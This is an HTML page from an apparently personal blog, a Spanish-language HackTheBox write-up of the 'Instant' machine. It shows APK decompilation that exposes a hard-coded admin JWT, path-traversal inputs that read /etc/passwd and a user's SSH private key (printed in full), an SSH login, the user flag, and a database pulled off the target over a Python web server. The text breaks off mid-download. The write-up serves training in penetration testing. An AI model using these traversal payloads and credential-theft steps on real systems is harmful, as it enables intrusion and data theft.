@@ -1,0 +1,518 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <title>
+  Instant Machine - HackTheBox · Celero0 Blog
+</title>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="color-scheme" content="light dark">
+
+
+
+
+<meta name="author" content="CeleroRKX">
+<meta name="description" content="Esta es una máquina de nivel medio de la plataforma HackTheBox.">
+<meta name="keywords" content="blog,developer,personal">
+
+
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Instant Machine - HackTheBox">
+  <meta name="twitter:description" content="Esta es una máquina de nivel medio de la plataforma HackTheBox.">
+
+<meta property="og:url" content="https://celero0.github.io/posts/instant/">
+  <meta property="og:site_name" content="Celero0 Blog">
+  <meta property="og:title" content="Instant Machine - HackTheBox">
+  <meta property="og:description" content="Esta es una máquina de nivel medio de la plataforma HackTheBox.">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2026-10-18T02:02:48+00:00">
+    <meta property="article:modified_time" content="2026-10-18T02:02:48+00:00">
+
+
+
+
+<link rel="canonical" href="https://celero0.github.io/posts/instant/">
+
+
+<link rel="preload" href="/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>
+
+
+  
+  
+  <link rel="stylesheet" href="/css/coder.min.4b392a85107b91dbdabc528edf014a6ab1a30cd44cafcd5325c8efe796794fca.css" integrity="sha256-SzkqhRB7kdvavFKO3wFKarGjDNRMr81TJcjv55Z5T8o=" crossorigin="anonymous" media="screen" />
+
+
+
+
+
+
+  
+    
+    
+    <link rel="stylesheet" href="/css/coder-dark.min.a00e6364bacbc8266ad1cc81230774a1397198f8cfb7bcba29b7d6fcb54ce57f.css" integrity="sha256-oA5jZLrLyCZq0cyBIwd0oTlxmPjPt7y6KbfW/LVM5X8=" crossorigin="anonymous" media="screen" />
+  
+
+
+
+ 
+
+
+
+
+<link rel="icon" type="image/svg+xml" href="/img/favicon.svg" sizes="any">
+<link rel="icon" type="image/png" href="/img/favicon-32x32.png" sizes="32x32">
+<link rel="icon" type="image/png" href="/img/favicon-16x16.png" sizes="16x16">
+
+<link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+
+
+
+
+
+
+</head>
+
+
+
+
+
+
+<body class="preload-transitions colorscheme-auto">
+  
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+  <main class="wrapper">
+    <nav class="navigation">
+  <section class="container">
+    
+    <a class="navigation-title" href="https://celero0.github.io/">
+      Celero0 Blog
+    </a>
+    
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/posts/">Writeups</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/about/">About</a>
+            </li>
+          
+        
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+    <div class="content">
+      
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">
+            <a class="title-link" href="https://celero0.github.io/posts/instant/">
+              Instant Machine - HackTheBox
+            </a>
+          </h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fa-solid fa-calendar" aria-hidden="true"></i>
+              <time datetime="2026-10-18T02:02:48Z">
+                October 18, 2026
+              </time>
+            </span>
+            <span class="reading-time">
+              <i class="fa-solid fa-clock" aria-hidden="true"></i>
+              7-minute read
+            </span>
+          </div>
+          
+          
+          
+        </div>
+      </header>
+
+      <div class="post-content">
+        
+        <hr>
+<ul>
+<li>Tags: #Machine #Medium  #Linux #APK #LFI #Swagger #SolarPutty</li>
+</ul>
+<hr>
+<h1 id="introducción">
+  Introducción
+  <a class="heading-link" href="#introducci%c3%b3n">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>Instant es una máquina Linux de HackTheBox de dificultad media. El vector de explotación parte del análisis de una aplicación Android (<code>.apk</code>) obtenida desde el servicio web, lo que permite descubrir subdominios, endpoints y un token JWT filtrado. A partir de ahí se llega a una API documentada con Swagger, en la que se explota una vulnerabilidad de Local File Inclusion (LFI) para filtrar la clave SSH privada de un usuario del sistema y obtener acceso inicial. La escalada de privilegios se logra mediante el análisis de una base de datos SQLite, el crackeo de hashes PBKDF2 y el desencriptado de un backup de sesiones de Solar-PuTTY que contiene las credenciales de <code>root</code>.</p>
+<h1 id="enumeración-nmap">
+  Enumeración Nmap
+  <a class="heading-link" href="#enumeraci%c3%b3n-nmap">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>Se realiza un escaneo de puertos abiertos.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p- --open -sS --min-rate <span style="color:#a5d6ff">2000</span> -vvv -n -Pn 10.129.231.155 -oG allPorts
+</span></span></code></pre></div><p>El resultado del escaneo revela únicamente 2 puertos abiertos, correspondientes al 22 y al 80. A continuación se realiza un escaneo de versiones y servicios sobre ambos puertos.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p22,80 -sCV 10.129.231.155 -oN portServices
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Starting Nmap 7.99 <span style="color:#ff7b72;font-weight:bold">(</span> https://nmap.org <span style="color:#ff7b72;font-weight:bold">)</span> at 2026-10-17 18:20 -0400
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#ff7b72">for</span> instant.htb <span style="color:#ff7b72;font-weight:bold">(</span>10.129.231.155<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#ff7b72;font-weight:bold">(</span>0.15s latency<span style="color:#ff7b72;font-weight:bold">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 <span style="color:#ff7b72;font-weight:bold">(</span>Ubuntu Linux; protocol 2.0<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#a5d6ff">256</span> 31:83:eb:9f:15:f8:40:a5:04:9c:cb:3f:f6:ec:49:76 <span style="color:#ff7b72;font-weight:bold">(</span>ECDSA<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#a5d6ff">256</span> 6f:66:03:47:0e:8a:e0:03:97:67:5b:41:cf:e2:c7:c7 <span style="color:#ff7b72;font-weight:bold">(</span>ED25519<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>80/tcp open  http    Apache httpd 2.4.58
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.58 <span style="color:#ff7b72;font-weight:bold">(</span>Ubuntu<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>|_http-title: Instant Wallet
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#ff7b72">done</span>: <span style="color:#a5d6ff">1</span> IP address <span style="color:#ff7b72;font-weight:bold">(</span><span style="color:#a5d6ff">1</span> host up<span style="color:#ff7b72;font-weight:bold">)</span> scanned in 11.80 seconds
+</span></span></code></pre></div><p>Del resultado solo obtenemos los servicios que corren detrás de los puertos; además confirmamos que <code>apache</code> está activo en el puerto 80.</p>
+<p>Para profundizar el análisis utilizaremos <code>whatweb</code>, de la siguiente forma:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>whatweb http://10.129.231.155
+</span></span></code></pre></div><pre tabindex="0"><code>http://10.129.231.155 [301 Moved Permanently] Apache[2.4.58], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.58 (Ubuntu)], IP[10.129.231.155], RedirectLocation[http://instant.htb/], Title[301 Moved Permanently]
+http://instant.htb/ [200 OK] Apache[2.4.58], Bootstrap[4.0.0], Country[RESERVED][ZZ], Email[support@instant.htb], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.58 (Ubuntu)], IP[10.129.231.155], JQuery[3.2.1], Script, Title[Instant Wallet]
+</code></pre><p>En el resultado identificamos el dominio <code>instant.htb</code>, por lo cual procedemos a agregarlo a nuestro <code>/etc/hosts</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#a5d6ff">&#39;10.129.231.155 instant.htb&#39;</span> | sudo tee -a /etc/hosts
+</span></span></code></pre></div><h1 id="enumeración-http">
+  Enumeración HTTP
+  <a class="heading-link" href="#enumeraci%c3%b3n-http">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>Al ingresar a la página web, tenemos lo siguiente:</p>
+<img src="/images/Pasted image 20261017195716.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Existe un endpoint llamado <code>downloads</code> que permite descargar un archivo <code>.apk</code>; procedemos a descargarlo para analizarlo.</p>
+<img src="/images/Pasted image 20261017195912.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Al ejecutar <code>file</code>, obtenemos lo siguiente:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>file instant.apk 
+</span></span><span style="display:flex;"><span>instant.apk: Android package <span style="color:#ff7b72;font-weight:bold">(</span>APK<span style="color:#ff7b72;font-weight:bold">)</span>, with gradle app-metadata.properties, with APK Signing Block
+</span></span></code></pre></div><p>Descompilamos el código con <code>jadx</code> para identificar endpoints de interés:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>jadx /home/celero0/HTB/instant/instant.apk -d /home/celero0/HTB/instant/instant_src
+</span></span><span style="display:flex;"><span>INFO  - loading ...
+</span></span><span style="display:flex;"><span>INFO  - processing ...
+</span></span><span style="display:flex;"><span>ERROR - finished with errors, count: <span style="color:#a5d6ff">86</span>
+</span></span></code></pre></div><p>Sobre el código descompilado podemos buscar endpoints, dominios o datos de configuración.</p>
+<p>Para ello utilizaremos el siguiente comando:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>rg -n -i <span style="color:#a5d6ff">&#39;https?://|wss?://|api[_-]?key|client[_-]?secret|firebase|graphql|retrofit|okhttp&#39;</span> instant_src &gt;&gt; filter
+</span></span></code></pre></div><p>Al revisar el archivo <code>filter</code> y filtrarlo con <code>grep</code> por <code>instant.htb</code>, encontramos el subdominio <code>mywalletv1.instant.htb</code>. Además, identificamos un <code>JWT</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#a5d6ff">&#34;Authorization&#34;</span>, <span style="color:#a5d6ff">&#34;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA&#34;</span>
+</span></span></code></pre></div><p>que corresponde al endpoint <code>http://mywalletv1.instant.htb/api/v1/view/profile</code>.</p>
+<img src="/images/Pasted image 20261017202227.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Ampliando la búsqueda con <code>rg</code> para incluir también <code>instant.htb</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>rg -n -i <span style="color:#a5d6ff">&#39;https?://|wss?://|api[_-]?key|client[_-]?secret|firebase|graphql|retrofit|okhttp|instant.htb&#39;</span> instant_src &gt;&gt; filter2
+</span></span></code></pre></div><p>y nuevamente filtrando con <code>grep</code> por <code>instant.htb</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat filter2 | grep <span style="color:#a5d6ff">&#34;instant.htb&#34;</span>
+</span></span></code></pre></div><p>encontramos un segundo subdominio: <code>swagger-ui.instant.htb</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat filter2 | grep <span style="color:#a5d6ff">&#34;instant.htb&#34;</span>
+</span></span><span style="display:flex;"><span>instant_src/resources/res/xml/network_security_config.xml:4:        &lt;domain <span style="color:#79c0ff">includeSubdomains</span><span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#34;true&#34;</span>&gt;mywalletv1.instant.htb
+</span></span><span style="display:flex;"><span>instant_src/resources/res/xml/network_security_config.xml:6:        &lt;domain <span style="color:#79c0ff">includeSubdomains</span><span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#34;true&#34;</span>&gt;swagger-ui.instant.htb
+</span></span><span style="display:flex;"><span>instant_src/resources/res/layout/activity_forgot_password.xml:20:            android:text<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#34;Please contact support@instant.htb to have your account recovered&#34;</span>
+</span></span></code></pre></div><p>Agregamos los nuevos subdominios, quedando de la siguiente forma:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat /etc/hosts | tail -n <span style="color:#a5d6ff">1</span>
+</span></span><span style="display:flex;"><span>10.129.231.155 instant.htb mywalletv1.instant.htb swagger-ui.instant.htb
+</span></span></code></pre></div><p>El subdominio <code>swagger-ui.instant.htb</code> aloja la interfaz web de Swagger, que permite visualizar la documentación de la API y explorar sus endpoints disponibles.</p>
+<img src="/images/Pasted image 20261017212256.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>En <code>Authorize</code> podemos ingresar la cookie identificada en el código del APK.</p>
+<img src="/images/Pasted image 20261017212335.png" style="width:100%; height:auto; display:block; margin:auto;">
+<h1 id="explotando-lfi">
+  Explotando LFI
+  <a class="heading-link" href="#explotando-lfi">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>Encontramos un endpoint que permite leer <code>logs</code> del sistema, el cual solicita una ruta como parámetro:</p>
+<img src="/images/Pasted image 20261017212512.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Al enviar como ruta <code>/../../../etc/passwd</code>, confirmamos que tenemos acceso de lectura.</p>
+<img src="/images/Pasted image 20261017212622.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Identificamos la existencia del usuario <code>shirohige</code>, por lo que intentamos leer su <code>id_rsa</code> mediante la ruta <code>/../../../home/shirohige/.ssh/id_rsa</code>.</p>
+<p>Obtenemos el <code>id_rsa</code>, aunque con formato incorrecto debido a caracteres adicionales:</p>
+<img src="/images/Pasted image 20261017212750.png" style="width:100%; height:auto; display:block; margin:auto;">
+<h1 id="acceso-inicial">
+  Acceso inicial
+  <a class="heading-link" href="#acceso-inicial">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>Una vez corregido el formato, el <code>id_rsa</code> queda de la siguiente forma:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>-----BEGIN OPENSSH PRIVATE KEY-----
+</span></span><span style="display:flex;"><span>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
+</span></span><span style="display:flex;"><span>NhAAAAAwEAAQAAAYEApbntlalmnZWcTVZ0skIN2+Ppqr4xjYgIrZyZzd9YtJGuv/w3GW8B
+</span></span><span style="display:flex;"><span>nwQ1vzh3BDyxhL3WLA3jPnkbB8j4luRrOfHNjK8lGefOMYtY/T5hE0VeHv73uEOA/BoeaH
+</span></span><span style="display:flex;"><span>dAGhQuAAsDj8Avy1yQMZDV31PHcGEDu/0dU9jGmhjXfS70gfebpII3js9OmKXQAFc2T5k/
+</span></span><span style="display:flex;"><span>5xL+1MHnZBiQqKvjbphueqpy9gDadsiAvKtOA8I6hpDDLZalak9Rgi+BsFvBsnz244uCBY
+</span></span><span style="display:flex;"><span>8juWZrzme8TG5Np6KIg1tdZ1cqRL7lNVMgo7AdwQCVrUhBxKvTEJmIzR/4o+/w9njJ3+WF
+</span></span><span style="display:flex;"><span>uaMbBzOsNCAnXb1Mk0ak42gNLqcrYmupUepN1QuZPL7xAbDNYK2OCMxws3rFPHgjhbqWPS
+</span></span><span style="display:flex;"><span>jBlC7kaBZFqbUOA57SZPqJY9+F0jttWqxLxr5rtL15JNaG+rDfkRmmMzbGryCRiwPc//AF
+</span></span><span style="display:flex;"><span>Oq8vzE9XjiXZ2P/jJ/EXahuaL9A2Zf9YMLabUgGDAAAFiKxBZXusQWV7AAAAB3NzaC1yc2
+</span></span><span style="display:flex;"><span>EAAAGBAKW57ZWpZp2VnE1WdLJCDdvj6aq+MY2ICK2cmc3fWLSRrr/8NxlvAZ8ENb84dwQ8
+</span></span><span style="display:flex;"><span>sYS91iwN4z55GwfI+JbkaznxzYyvJRnnzjGLWP0+YRNFXh7+97hDgPwaHmh3QBoULgALA4
+</span></span><span style="display:flex;"><span>/AL8tckDGQ1d9Tx3BhA7v9HVPYxpoY130u9IH3m6SCN47PTpil0ABXNk+ZP+cS/tTB52QY
+</span></span><span style="display:flex;"><span>kKir426YbnqqcvYA2nbIgLyrTgPCOoaQwy2WpWpPUYIvgbBbwbJ89uOLggWPI7lma85nvE
+</span></span><span style="display:flex;"><span>xuTaeiiINbXWdXKkS+5TVTIKOwHcEAla1IQcSr0xCZiM0f+KPv8PZ4yd/lhbmjGwczrDQg
+</span></span><span style="display:flex;"><span>J129TJNGpONoDS6nK2JrqVHqTdULmTy+8QGwzWCtjgjMcLN6xTx4I4W6lj0owZQu5GgWRa
+</span></span><span style="display:flex;"><span>m1DgOe0mT6iWPfhdI7bVqsS8a+a7S9eSTWhvqw35EZpjM2xq8gkYsD3P/wBTqvL8xPV44l
+</span></span><span style="display:flex;"><span>2dj/4yfxF2obmi/QNmX/WDC2m1IBgwAAAAMBAAEAAAGARudITbq/S3aB+9icbtOx6D0XcN
+</span></span><span style="display:flex;"><span>SUkM/9noGckCcZZY/aqwr2a+xBTk5XzGsVCHwLGxa5NfnvGoBn3ynNqYkqkwzv+1vHzNCP
+</span></span><span style="display:flex;"><span>OEU9GoQAtmT8QtilFXHUEof+MIWsqDuv/pa3vF3mVORSUNJ9nmHStzLajShazs+1EKLGNy
+</span></span><span style="display:flex;"><span>nKtHxCW9zWdkQdhVOTrUGi2+VeILfQzSf0nq+f3HpGAMA4rESWkMeGsEFSSuYjp5oGviHb
+</span></span><span style="display:flex;"><span>T3rfZJ9w6Pj4TILFWV769TnyxWhUHcnXoTX90Tf+rAZgSNJm0I0fplb0dotXxpvWtjTe9y
+</span></span><span style="display:flex;"><span>1Vr6kD/aH2rqSHE1lbO6qBoAdiyycUAajZFbtHsvI5u2SqLvsJR5AhOkDZw2uO7XS0sE/0
+</span></span><span style="display:flex;"><span>cadJY1PEq0+Q7X7WeAqY+juyXDwVDKbA0PzIq66Ynnwmu0d2iQkLHdxh/Wa5pfuEyreDqA
+</span></span><span style="display:flex;"><span>wDjMz7oh0APgkznURGnF66jmdE7e9pSV1wiMpgsdJ3UIGm6d/cFwx8I4odzDh+1jRRAAAA
+</span></span><span style="display:flex;"><span>wQCMDTZMyD8WuHpXgcsREvTFTGskIQOuY0NeJz3yOHuiGEdJu227BHP3Q0CRjjHC74fN18
+</span></span><span style="display:flex;"><span>nB8V1c1FJ03Bj9KKJZAsX+nDFSTLxUOy7/T39Fy45/mzA1bjbgRfbhheclGqcOW2ZgpgCK
+</span></span><span style="display:flex;"><span>gzGrFox3onf+N5Dl0Xc9FWdjQFcJi5KKpP/0RNsjoXzU2xVeHi4EGoO+6VW2patq2sblVt
+</span></span><span style="display:flex;"><span>pErOwUa/cKVlTdoUmIyeqqtOHCv6QmtI3kylhahrQw0rcbkSgAAADBAOAK8JrksZjy4MJh
+</span></span><span style="display:flex;"><span>HSsLq1bCQ6nSP+hJXXjlm0FYcC4jLHbDoYWSilg96D1n1kyALvWrNDH9m7RMtS5WzBM3FX
+</span></span><span style="display:flex;"><span>zKCwZBxrcPuU0raNkO1haQlupCCGGI5adMLuvefvthMxYxoAPrppptXR+g4uimwp1oJcO5
+</span></span><span style="display:flex;"><span>SSYSPxMLojS9gg++Jv8IuFHerxoTwr1eY8d3smeOBc62yz3tIYBwSe/L1nIY6nBT57DOOY
+</span></span><span style="display:flex;"><span>CGGElC1cS7pOg/XaOh1bPMaJ4Hi3HUWwAAAMEAvV2Gzd98tSB92CSKct+eFqcX2se5UiJZ
+</span></span><span style="display:flex;"><span>n90GYFZoYuRerYOQjdGOOCJ4D/SkIpv0qqPQNulejh7DuHKiohmK8S59uMPMzgzQ4BRW0G
+</span></span><span style="display:flex;"><span>HwDs1CAcoWDnh7yhGK6lZM3950r1A/RPwt9FcvWfEoQqwvCV37L7YJJ7rDWlTa06qHMRMP
+</span></span><span style="display:flex;"><span>5VNy/4CNnMdXALx0OMVNNoY1wPTAb0x/Pgvm24KcQn/7WCms865is11BwYYPaig5F5Zo1r
+</span></span><span style="display:flex;"><span>bhd6Uh7ofGRW/5AAAAEXNoaXJvaGlnZUBpbnN0YW50AQ<span style="color:#ff7b72;font-weight:bold">==</span>
+</span></span><span style="display:flex;"><span>-----END OPENSSH PRIVATE KEY-----
+</span></span></code></pre></div><p>Guardamos la clave en nuestra máquina atacante y nos conectamos por <code>SSH</code> a la máquina víctima como el usuario <code>shirohige</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh -i id_rsa shirohige@instant.htb
+</span></span><span style="display:flex;"><span>The authenticity of host <span style="color:#a5d6ff">&#39;instant.htb (10.129.231.155)&#39;</span> can<span style="color:#a5d6ff">&#39;t be established.
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">ED25519 key fingerprint is: SHA256:r+JkzsLsWoJi57npPp0MXIJ0/vVzZ22zbB7j3DWmdiY
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">This host key is known by the following other names/addresses:
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">    ~/.ssh/known_hosts:4: [hashed name]
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">Are you sure you want to continue connecting (yes/no/[fingerprint])? YES
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">Warning: Permanently added &#39;</span>instant.htb<span style="color:#a5d6ff">&#39; (ED25519) to the list of known hosts.
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">Welcome to Ubuntu 24.04.1 LTS (GNU/Linux 6.8.0-45-generic x86_64)
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff"> * Documentation:  https://help.ubuntu.com
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff"> * Management:     https://landscape.canonical.com
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff"> * Support:        https://ubuntu.com/pro
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">This system has been minimized by removing packages and content that are
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">not required on a system that users do not log into.
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">To restore this content, you can run the &#39;</span>unminimize<span style="color:#f85149">&#39;</span> command.
+</span></span><span style="display:flex;"><span>Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Last login: Sun Oct <span style="color:#a5d6ff">18</span> 00:29:13 <span style="color:#a5d6ff">2026</span> from 10.10.14.48
+</span></span><span style="display:flex;"><span>shirohige@instant:~$
+</span></span></code></pre></div><p>Con acceso al sistema, podemos leer la flag <code>user.txt</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat user.txt
+</span></span><span style="display:flex;"><span>a4be6ccb121f318134bff469d0583fef
+</span></span></code></pre></div><h1 id="escalada-de-privilegios">
+  Escalada de privilegios
+  <a class="heading-link" href="#escalada-de-privilegios">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>Buscando una vía de movimiento lateral o escalar privilegios, encontramos el archivo <code>instant.db</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>shirohige@instant:~/projects/mywallet/Instant-Api/mywallet/instance$ ls
+</span></span><span style="display:flex;"><span>instant.db
+</span></span></code></pre></div><p>Levantamos un servicio web con <code>python</code> de la siguiente forma:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 -m http.server <span style="color:#a5d6ff">8081</span>
+</span></span></code></pre></div><p>y desde nuestra máquina atacante descargamos el archivo con <code>wget</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wget http://instant.htb:8081/instant.db
+</span></span><span style="display:flex;"><span>--2026-10-17 21:08:19--  http://instant.htb:8081/instant.db
+</span></span><span style="display:flex;"><span>Resolving instant.htb <span style="color:#ff7b72;font-weight:bold">(</span>instant.htb<span style="color:#ff7b72;font-weight:bold">)</span>... 10.129.231.155
+</span></span><span style="display:flex;"><span>Connecting to instant.htb <span style="color:#ff7b72;font-weight:bold">(</span>instant.htb<span style="color:#ff7b72;font-weight:bold">)</span>|10.129.231.155|:8081... connected.
+</span></span><span style="display:flex;"><span>HTTP request sent, awaiting response... <span style="color:#a5d6ff">200</span> OK
+</span></span><span style="display:flex;"><span>Length: <span style="color:#a5d6ff">36864</span> <span style="color:#ff7b72;font-weight:bold">(</span>36K<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#ff7b72;font-weight:bold">[</span>application/octet-stream<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>Saving to: ‘instant.db’
+</span></span><span style="display:flex;"><span>
